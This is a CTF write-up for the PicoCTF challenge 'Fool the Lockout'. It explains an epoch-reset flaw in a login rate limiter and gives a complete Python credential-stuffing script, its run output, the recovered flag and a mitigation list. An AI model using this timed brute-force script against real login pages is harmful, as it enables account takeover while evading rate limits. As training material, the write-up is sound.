# Fool the Lockout - PicoCTF 2026 Writeup

**Challenge:** Fool the Lockout  
**Author:** David Gaviria  
**Points:** 200  
**Category:** Web Exploitation  

## Challenge Description

Your friend is building a simple website with a login page. To stop brute forcing and credential stuffing, they've added an **IP-based rate limit**: exceed the attempt threshold and your IP is blocked for a while.

They're convinced this makes guessing credentials impossible. To test their defense, they've:
- Created a dummy account with a random username–password pair from public credential lists
- Given you those username and password lists
- Shared the full source code

**Goal:** Bypass the rate limit, log in, and capture the flag.

## Code Analysis

### Rate Limiting Mechanism

The app implements IP-based rate limiting with these parameters:

```python
MAX_REQUESTS = 10      # max failed attempts before a user is locked out
EPOCH_DURATION = 30    # timeframe for failed attempts (in seconds)
LOCKOUT_DURATION = 120 # duration a user will be locked out for (in seconds)
```

### Tracking Structure

```python
request_rates = {
    "ip_addr": {
        "num_requests": int,      # Number of POST requests in current epoch
        "epoch_start": timestamp,  # When current epoch started
        "lockout_until": int       # When lockout expires (-1 if not locked out)
    }
}
```

### Key Function: `refresh_request_rates_db(client_ip)`

This function is called **before every request check**:

```python
def refresh_request_rates_db(client_ip):
    curr_time = time.time()
    if client_ip not in request_rates:
        return
    
    # ⚠️ KEY: Check if EPOCH duration has elapsed
    epoch_start_time = request_rates[client_ip]["epoch_start"] 
    if curr_time - epoch_start_time > EPOCH_DURATION:  # > 30 seconds
        request_rates[client_ip]["num_requests"] = 0     # RESET COUNTER
        request_rates[client_ip]["epoch_start"] = -1
    
    # Check if LOCKOUT period has ended
    lockout_end = request_rates[client_ip]["lockout_until"]
    if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1
```

## The Vulnerability: EPOCH Reset, Not LOCKOUT

### The Naive Approach (Slow)
Wait for the complete `LOCKOUT_DURATION` (120 seconds) = 2 minutes between cycles.

### The Smart Approach (Fast) ⭐
**The counter resets after `EPOCH_DURATION` (30 seconds), not 120 seconds!**

The function automatically resets `num_requests` to 0 when more than 30 seconds have passed since `epoch_start`. This means:

1. Make 10 failed login attempts (fills the epoch)
2. Wait ~31 seconds for the EPOCH to reset
3. The counter goes back to 0, allowing 10 more attempts
4. **Repeat** with different credentials

**Time saved:** ~75% (31 seconds per cycle vs 120 seconds)

## Exploitation Strategy

### Step 1: Load Credentials
The challenge provides a list of 100 username:password pairs in `creds-dump.txt`.

### Step 2: Batch Testing in Cycles
- Try 10 credentials per cycle
- After 10 failed attempts → wait ~31 seconds
- Reset and try next 10 credentials
- Continue until credentials match

### Step 3: Timing Calculation
Each cycle takes approximately:
- ~10 requests × 0.5s = 5 seconds (actual login attempts)
- ~31 seconds (waiting for EPOCH to reset)
- **~36 seconds per 10 credentials**

With 100 credentials = ~360 seconds = **~6 minutes total**

## Implementation

### Python Solver Script

```python
#!/usr/bin/env python3
import requests
import time
import re

URL = "http://candy-mountain.picoctf.net:56726"
LOGIN_URL = f"{URL}/login"

MAX_REQUESTS = 10
EPOCH_DURATION = 30

def load_credentials(filename):
    creds = []
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if line and ';' in line:
                username, password = line.split(';', 1)
                creds.append((username, password))
    return creds

def attempt_login(session, username, password):
    data = {'username': username, 'password': password}
    try:
        response = session.post(LOGIN_URL, data=data, timeout=10, allow_redirects=False)
        return response
    except Exception as e:
        print(f"[ERROR] {e}")
        return None

def is_rate_limited(response):
    if response is None:
        return False
    return 'Rate Limited' in response.text

def is_login_failed(response):
    if response is None:
        return False
    return 'Invalid username or password' in response.text

def is_login_success(response):
    if response is None:
        return False
    return response.status_code == 302 or 'flag' in response.text.lower()

def extract_flag(response_text):
    patterns = [
        r'picoctf\{[^}]+\}',
        r'flag\{[^}]+\}',
    ]
    for pattern in patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return match.group(0)
    return None

def solve():
    credentials = load_credentials('/home/aurel/CTF/creds-dump.txt')
    print(f"[*] Loaded {len(credentials)} credentials")
    print(f"[*] Strategy: 10 attempts per cycle, wait {EPOCH_DURATION+1}s for EPOCH reset\n")
    
    session = requests.Session()
    attempt_num = 0
    cycle = 0
    attempts_in_cycle = 0
    epoch_start_time = None
    
    for idx, (username, password) in enumerate(credentials):
        attempt_num += 1
        attempts_in_cycle += 1
        
        # If we've done 10 attempts in this cycle, wait for EPOCH to reset
        if attempts_in_cycle > MAX_REQUESTS:
            if epoch_start_time is None:
                epoch_start_time = time.time()
            
            elapsed = time.time() - epoch_start_time
            wait_time = (EPOCH_DURATION + 1) - elapsed
            
            if wait_time > 0:
                print(f"\n[!] Hit 10 attempts. Waiting {wait_time:.1f}s for EPOCH reset...")
                time.sleep(wait_time)
            
            cycle += 1
            attempts_in_cycle = 1
            epoch_start_time = time.time()
            print(f"[!] EPOCH reset. Resume...\n")
        
        print(f"[{attempt_num:3d}] Cycle {cycle+1}, attempt {attempts_in_cycle}/{MAX_REQUESTS}: {username}:{password[:10]:.<10} ", 
              end="", flush=True)
        
        response = attempt_login(session, username, password)
        
        if response is None:
            print("ERROR")
            continue
        
        if is_rate_limited(response):
            print("RATE LIMITED")
        elif is_login_failed(response):
            print("✗")
        elif is_login_success(response):
            print("✓ SUCCESS!")
            print("\n" + "="*70)
            print("[+] LOGIN SUCCESSFUL!")
            print("="*70)
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
            
            flag = extract_flag(response.text)
            if flag:
                print(f"[+] Flag: {flag}")
            else:
                try:
                    home = session.get(f"{URL}/", timeout=10)
                    if home.status_code == 200:
                        flag = extract_flag(home.text)
                        if flag:
                            print(f"[+] Flag found on home: {flag}")
                except:
                    pass
            
            return True
        else:
            print(f"? (status: {response.status_code})")
    
    print(f"\n[!] All credentials exhausted without success")
    return False

if __name__ == "__main__":
    solve()
```

## Solution Steps

1. **Download the credentials dump** (`creds-dump.txt`)
2. **Review the source code** (`app.py`) to understand the rate limiting logic
3. **Identify the vulnerability**: EPOCH reset after 30 seconds, not 120 seconds
4. **Create the solver script** that:
   - Loads 100 credentials
   - Attempts 10 per cycle
   - Waits ~31 seconds between cycles
5. **Run the script** and wait for a successful login

## Execution Output

```
[*] Loaded 100 credentials
[*] Strategy: 10 attempts per cycle, wait 31s for EPOCH reset

[  1] Cycle 1, attempt 1/10: rora:winner1... ✗
[  2] Cycle 1, attempt 2/10: birendra:rumble.... ✗
...
[ 10] Cycle 1, attempt 10/10: shamira:marion.... ✗

[!] Hit 10 attempts. Waiting 31.0s for EPOCH reset...
[!] EPOCH reset. Resume...

[ 11] Cycle 2, attempt 1/10: cymbre:california ✗
...
[ 76] Cycle 8, attempt 6/10: deane:shoe...... ✓ SUCCESS!

======================================================================
[+] LOGIN SUCCESSFUL!
======================================================================
[+] Username: deane
[+] Password: shoe
[+] Flag found on home: picoCTF{f00l_7h4t_l1m1t3r_b9fcf635}
```

## Key Insights

1. **Rate limiting != Brute force protection**: The app uses a naive epoch-based system that resets after 30 seconds, allowing attackers to effectively bypass restrictions by timing their attempts.

2. **Time windows matter**: The vulnerability exists because `EPOCH_DURATION` is much shorter than `LOCKOUT_DURATION`. An attacker can reset the counter before the full lockout kicks in.

3. **Single IP weakness**: The app doesn't implement any other protections (like account-based lockouts, exponential backoff, or CAPTCHA), making it vulnerable to patient attackers.

## Flag

```
picoCTF{f00l_7h4t_l1m1t3r_b9fcf635}
```

## Credentials

```
Username: deane
Password: shoe
```

## Mitigation

To fix this vulnerability:

1. **Implement account-based rate limiting** instead of IP-based
2. **Use exponential backoff** to increase wait times after multiple failures
3. **Add CAPTCHA challenges** after X failed attempts
4. **Use secure password hashing** and salts
5. **Implement account lockout** with manual admin unlock
6. **Monitor for brute force patterns** across multiple accounts
7. **Use a timeout-based approach** where lockouts are absolute, not epoch-based

## Challenge Difficulty

⭐⭐⭐ (Medium)

The main challenge is analyzing the code carefully to identify the timing vulnerability and implementing a patient brute-force attack that respects the rate limiting mechanism while exploiting its design flaw.
